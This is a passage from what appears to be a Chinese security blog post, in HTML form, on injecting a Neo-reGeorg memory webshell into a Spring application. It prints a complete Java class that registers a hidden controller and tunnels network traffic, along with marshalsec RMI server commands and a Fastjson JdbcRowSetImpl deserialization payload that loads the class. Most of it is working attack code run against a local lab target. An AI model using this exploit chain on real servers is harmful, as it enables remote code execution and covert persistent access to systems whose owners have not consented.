+<p>连接成功</p>
+<p><a href="https://imgtu.com/i/7omfW6"><img src="https://s4.ax1x.com/2022/01/24/7omfW6.png" srcset="/img/loading.gif" lazyload alt="7omfW6.png"></a></p>
+<p><a href="https://imgtu.com/i/7omWJx"><img src="https://s4.ax1x.com/2022/01/24/7omWJx.png" srcset="/img/loading.gif" lazyload alt="7omWJx.png"></a></p>
+<h1 id="注入Neo-reGeorg"><a href="#注入Neo-reGeorg" class="headerlink" title="注入Neo-reGeorg"></a>注入Neo-reGeorg</h1><h2 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p>用Neo-regeorg生成jsp文件，然后把代码复制过来就行，密码用的是pass</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;<br><span class="hljs-keyword">import</span> java.nio.ByteBuffer;<br><span class="hljs-keyword">import</span> java.nio.channels.SocketChannel;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MemNeoregeorg</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] de = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[] &#123;-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">30</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">31</span>,<span class="hljs-number">24</span>,<span class="hljs-number">40</span>,<span class="hljs-number">13</span>,<span class="hljs-number">25</span>,<span class="hljs-number">52</span>,<span class="hljs-number">60</span>,<span class="hljs-number">46</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">19</span>,<span class="hljs-number">43</span>,<span class="hljs-number">37</span>,<span class="hljs-number">0</span>,<span class="hljs-number">54</span>,<span class="hljs-number">15</span>,<span class="hljs-number">42</span>,<span class="hljs-number">16</span>,<span class="hljs-number">56</span>,<span class="hljs-number">3</span>,<span class="hljs-number">44</span>,<span class="hljs-number">34</span>,<span class="hljs-number">50</span>,<span class="hljs-number">53</span>,<span class="hljs-number">14</span>,<span class="hljs-number">33</span>,<span class="hljs-number">62</span>,<span class="hljs-number">21</span>,<span class="hljs-number">12</span>,<span class="hljs-number">17</span>,<span class="hljs-number">27</span>,<span class="hljs-number">63</span>,<span class="hljs-number">41</span>,<span class="hljs-number">49</span>,<span class="hljs-number">2</span>,<span class="hljs-number">48</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">39</span>,<span class="hljs-number">36</span>,<span class="hljs-number">6</span>,<span class="hljs-number">18</span>,<span class="hljs-number">22</span>,<span class="hljs-number">58</span>,<span class="hljs-number">11</span>,<span class="hljs-number">32</span>,<span class="hljs-number">57</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">61</span>,<span class="hljs-number">51</span>,<span class="hljs-number">28</span>,<span class="hljs-number">55</span>,<span class="hljs-number">23</span>,<span class="hljs-number">1</span>,<span class="hljs-number">59</span>,<span class="hljs-number">35</span>,<span class="hljs-number">29</span>,<span class="hljs-number">38</span>,<span class="hljs-number">8</span>,<span class="hljs-number">45</span>,<span class="hljs-number">26</span>,<span class="hljs-number">47</span>,<span class="hljs-number">5</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>&#125;;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span>[] en = <span class="hljs-string">&quot;DqYJ7zckvj8gS2OFHTdA9Rep03xUnt+/hPLsbCua1WGBKw6yZXMm4NEoIifr5lQV&quot;</span>.toCharArray();<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MemNeoregeorg</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.<br>                currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br>        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 通过反射获得自定义 controller 中唯一的 Method 对象</span><br>        Method method = Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getMappingRegistry&quot;</span>);<br>        <span class="hljs-comment">// 属性被 private 修饰，所以 setAccessible true</span><br>        method.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 通过反射获得该类的test方法</span><br>        Method method2 = MemNeoregeorg.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-comment">// 定义该controller的path</span><br>        PatternsRequestCondition url = <span class="hljs-keyword">new</span> PatternsRequestCondition(<span class="hljs-string">&quot;/neoregeorg&quot;</span>);<br>        <span class="hljs-comment">// 定义允许访问的HTTP方法</span><br>        RequestMethodsRequestCondition ms = <span class="hljs-keyword">new</span> RequestMethodsRequestCondition();<br>        <span class="hljs-comment">// 在内存中动态注册 controller</span><br>        RequestMappingInfo info = <span class="hljs-keyword">new</span> RequestMappingInfo(url, ms, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        <span class="hljs-comment">// 创建用于处理请求的对象，避免无限循环使用另一个构造方法</span><br>        MemNeoregeorg injectToController = <span class="hljs-keyword">new</span> MemNeoregeorg(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-comment">// 将该controller注册到Spring容器</span><br>        mappingHandlerMapping.registerMapping(info, injectToController, method2);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">MemNeoregeorg</span><span class="hljs-params">(String aaa)</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">puts</span><span class="hljs-params">(HttpServletResponse r, String str)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bs = str.getBytes();<br>        ServletOutputStream so = r.getOutputStream();<br>        so.write(bs, <span class="hljs-number">0</span>, bs.length);<br>        so.close();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">b64en</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] data)</span> </span>&#123;<br>        StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer();<br>        <span class="hljs-keyword">int</span> len = data.length;<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> b1, b2, b3;<br>        <span class="hljs-keyword">while</span> (i &lt; len) &#123;<br>            b1 = data[i++] &amp; <span class="hljs-number">0xff</span>;<br>            <span class="hljs-keyword">if</span> (i == len) &#123;<br>                sb.append(en[b1 &gt;&gt;&gt; <span class="hljs-number">2</span>]);<br>                sb.append(en[(b1 &amp; <span class="hljs-number">0x3</span>) &lt;&lt; <span class="hljs-number">4</span>]);<br>                sb.append(<span class="hljs-string">&quot;==&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            b2 = data[i++] &amp; <span class="hljs-number">0xff</span>;<br>            <span class="hljs-keyword">if</span> (i == len) &#123;<br>                sb.append(en[b1 &gt;&gt;&gt; <span class="hljs-number">2</span>]);<br>                sb.append(en[((b1 &amp; <span class="hljs-number">0x03</span>) &lt;&lt; <span class="hljs-number">4</span>)<br>                        | ((b2 &amp; <span class="hljs-number">0xf0</span>) &gt;&gt;&gt; <span class="hljs-number">4</span>)]);<br>                sb.append(en[(b2 &amp; <span class="hljs-number">0x0f</span>) &lt;&lt; <span class="hljs-number">2</span>]);<br>                sb.append(<span class="hljs-string">&quot;=&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            b3 = data[i++] &amp; <span class="hljs-number">0xff</span>;<br>            sb.append(en[b1 &gt;&gt;&gt; <span class="hljs-number">2</span>]);<br>            sb.append(en[((b1 &amp; <span class="hljs-number">0x03</span>) &lt;&lt; <span class="hljs-number">4</span>)<br>                    | ((b2 &amp; <span class="hljs-number">0xf0</span>) &gt;&gt;&gt; <span class="hljs-number">4</span>)]);<br>            sb.append(en[((b2 &amp; <span class="hljs-number">0x0f</span>) &lt;&lt; <span class="hljs-number">2</span>)<br>                    | ((b3 &amp; <span class="hljs-number">0xc0</span>) &gt;&gt;&gt; <span class="hljs-number">6</span>)]);<br>            sb.append(en[b3 &amp; <span class="hljs-number">0x3f</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] b64de(String str) &#123;<br>        <span class="hljs-keyword">byte</span>[] data = str.getBytes();<br>        <span class="hljs-keyword">int</span> len = data.length;<br>        ByteArrayOutputStream buf = <span class="hljs-keyword">new</span> ByteArrayOutputStream(len);<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> b1, b2, b3, b4;<br>        <span class="hljs-keyword">while</span> (i &lt; len) &#123;<br>            <span class="hljs-keyword">do</span> &#123;<br>                b1 = de[data[i++]];<br>            &#125; <span class="hljs-keyword">while</span> (i &lt; len &amp;&amp; b1 == -<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (b1 == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">do</span> &#123;<br>                b2 = de[data[i++]];<br>            &#125; <span class="hljs-keyword">while</span> (i &lt; len &amp;&amp; b2 == -<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (b2 == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            buf.write((<span class="hljs-keyword">int</span>) ((b1 &lt;&lt; <span class="hljs-number">2</span>) | ((b2 &amp; <span class="hljs-number">0x30</span>) &gt;&gt;&gt; <span class="hljs-number">4</span>)));<br>            <span class="hljs-keyword">do</span> &#123;<br>                b3 = data[i++];<br>                <span class="hljs-keyword">if</span> (b3 == <span class="hljs-number">61</span>) &#123;<br>                    <span class="hljs-keyword">return</span> buf.toByteArray();<br>                &#125;<br>                b3 = de[b3];<br>            &#125; <span class="hljs-keyword">while</span> (i &lt; len &amp;&amp; b3 == -<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (b3 == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            buf.write((<span class="hljs-keyword">int</span>) (((b2 &amp; <span class="hljs-number">0x0f</span>) &lt;&lt; <span class="hljs-number">4</span>) | ((b3 &amp; <span class="hljs-number">0x3c</span>) &gt;&gt;&gt; <span class="hljs-number">2</span>)));<br>            <span class="hljs-keyword">do</span> &#123;<br>                b4 = data[i++];<br>                <span class="hljs-keyword">if</span> (b4 == <span class="hljs-number">61</span>) &#123;<br>                    <span class="hljs-keyword">return</span> buf.toByteArray();<br>                &#125;<br>                b4 = de[b4];<br>            &#125; <span class="hljs-keyword">while</span> (i &lt; len &amp;&amp; b4 == -<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (b4 == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            buf.write((<span class="hljs-keyword">int</span>) (((b3 &amp; <span class="hljs-number">0x03</span>) &lt;&lt; <span class="hljs-number">6</span>) | b4));<br>        &#125;<br>        <span class="hljs-keyword">return</span> buf.toByteArray();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">// 获取request和response对象</span><br>        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br>        HttpSession session=request.getSession();<br><br>        response.setStatus(<span class="hljs-number">200</span>);<br>        String cmd = request.getHeader(<span class="hljs-string">&quot;Cz&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-keyword">null</span>) &#123;<br>            String mark = cmd.substring(<span class="hljs-number">0</span>,<span class="hljs-number">22</span>);<br>            cmd = cmd.substring(<span class="hljs-number">22</span>);<br>            response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;zWQerW2uiqArhyKyQJSKFkEYBoh546MmAGmqNe&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd.compareTo(<span class="hljs-string">&quot;GVwydX22KEDdLXVNICQlK7VigwqOr1&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    String[] target_ary = <span class="hljs-keyword">new</span> String(b64de(request.getHeader(<span class="hljs-string">&quot;Ahjncviespbziuar&quot;</span>))).split(<span class="hljs-string">&quot;\\|&quot;</span>);<br>                    String target = target_ary[<span class="hljs-number">0</span>];<br>                    <span class="hljs-keyword">int</span> port = Integer.parseInt(target_ary[<span class="hljs-number">1</span>]);<br>                    SocketChannel socketChannel = SocketChannel.open();<br>                    socketChannel.connect(<span class="hljs-keyword">new</span> InetSocketAddress(target, port));<br>                    socketChannel.configureBlocking(<span class="hljs-keyword">false</span>);<br>                    session.setAttribute(mark, socketChannel);<br>                    response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;zWQerW2uiqArhyKyQJSKFkEYBoh546MmAGmqNe&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    response.setHeader(<span class="hljs-string">&quot;Rhikuunn&quot;</span>, <span class="hljs-string">&quot;2dzkzCC6JbZpMe30VuvalwvNc702mw1QqbKbekOHbKCZmb3gM0JMD3l2&quot;</span>);<br>                    response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;pmRO3UjyF3OtcU5Z0Ty0epe9VKmObv0nF6fjW&quot;</span>);<br>                &#125;<br>                puts(response, <span class="hljs-string">&quot;&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd.compareTo(<span class="hljs-string">&quot;E4oGJ6dPZO9wSJpJ4kY8AwXJ0UTXs072uvB&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>                SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);<br>                <span class="hljs-keyword">try</span>&#123;<br>                    socketChannel.socket().close();<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                &#125;<br>                session.removeAttribute(mark);<br>                puts(response, <span class="hljs-string">&quot;&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd.compareTo(<span class="hljs-string">&quot;wqxFnQchjYWANIpP_2O5&quot;</span>) == <span class="hljs-number">0</span>)&#123;<br>                SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);<br>                <span class="hljs-keyword">try</span>&#123;<br>                    ByteBuffer buf = ByteBuffer.allocate(<span class="hljs-number">513</span>);<br>                    <span class="hljs-keyword">int</span> bytesRead = socketChannel.read(buf);<br>                    ServletOutputStream so = response.getOutputStream();<br>                    <span class="hljs-keyword">while</span> (bytesRead &gt; <span class="hljs-number">0</span>)&#123;<br>                        <span class="hljs-keyword">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[bytesRead];<br>                        System.arraycopy(buf.array(), <span class="hljs-number">0</span>, data, <span class="hljs-number">0</span>, bytesRead);<br>                        <span class="hljs-keyword">byte</span>[] base64 = b64en(data).getBytes();<br>                        so.write(base64, <span class="hljs-number">0</span>, base64.length);<br>                        buf.clear();<br>                        bytesRead = socketChannel.read(buf);<br>                    &#125;<br>                    so.close();<br>                    response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;zWQerW2uiqArhyKyQJSKFkEYBoh546MmAGmqNe&quot;</span>);<br><br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;pmRO3UjyF3OtcU5Z0Ty0epe9VKmObv0nF6fjW&quot;</span>);<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd.compareTo(<span class="hljs-string">&quot;fDVO47AZO6TXX5WT9oQJHTUFgtNTLslwRV6&quot;</span>) == <span class="hljs-number">0</span>)&#123;<br>                SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);<br>                <span class="hljs-keyword">try</span> &#123;<br><br>                    <span class="hljs-keyword">int</span> readlen = request.getContentLength();<br>                    <span class="hljs-keyword">byte</span>[] buff = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[readlen];<br><br>                    request.getInputStream().read(buff, <span class="hljs-number">0</span>, readlen);<br>                    <span class="hljs-keyword">byte</span>[] base64 = b64de(<span class="hljs-keyword">new</span> String(buff));<br>                    ByteBuffer buf = ByteBuffer.allocate(base64.length);<br>                    buf.clear();<br>                    buf.put(base64);<br>                    buf.flip();<br><br>                    <span class="hljs-keyword">while</span>(buf.hasRemaining())<br>                        socketChannel.write(buf);<br><br>                    response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;zWQerW2uiqArhyKyQJSKFkEYBoh546MmAGmqNe&quot;</span>);<br><br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    response.setHeader(<span class="hljs-string">&quot;Rhikuunn&quot;</span>, <span class="hljs-string">&quot;BUpCTMWYPB0W0z1xw7MBOK26I&quot;</span>);<br>                    response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;pmRO3UjyF3OtcU5Z0Ty0epe9VKmObv0nF6fjW&quot;</span>);<br>                    socketChannel.socket().close();<br>                &#125;<br>                puts(response, <span class="hljs-string">&quot;&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            puts(response, <span class="hljs-string">&quot;&lt;!-- OnPi3V9A0mDFCR2mjWB6R132S3A1SswOD3XTr6cqcHHSqjksLziNsPtSi5 --&gt;&quot;</span>);<br>        &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="注入过程-1"><a href="#注入过程-1" class="headerlink" title="注入过程"></a>注入过程</h2><p>开启web服务和rmi</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> -m SimpleHTTPServer <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://127.0.0.1:8888/#MemNeoregeorg&quot;</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>利用</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-attr">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:9999/MemNeoregeorg&quot;</span>,<br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/7omIyD"><img src="https://s4.ax1x.com/2022/01/24/7omIyD.png" srcset="/img/loading.gif" lazyload alt="7omIyD.png"></a></p>
+<p>注入成功</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span>/neoregeorg<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/7om5QO"><img src="https://s4.ax1x.com/2022/01/24/7om5QO.png" srcset="/img/loading.gif" lazyload alt="7om5QO.png"></a></p>
